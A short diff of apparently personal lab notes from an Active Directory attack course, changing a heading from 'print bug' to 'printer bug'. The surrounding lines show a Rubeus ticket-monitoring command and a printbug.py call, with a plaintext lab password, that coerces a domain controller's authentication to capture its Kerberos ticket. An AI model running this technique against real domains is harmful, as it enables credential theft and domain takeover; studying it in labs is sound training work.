@@ -294,7 +294,7 @@ monitor ticket with rubeus:
 ```
 .\Rubeus.exe monitor /interval:5 /nowrap
 ```
-trigger print bug:
+trigger printer bug:
 ```
 python3 printbug.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM@172.16.2.1 dcorp-appsrv.dollarcorp.moneycorp.local
 ```
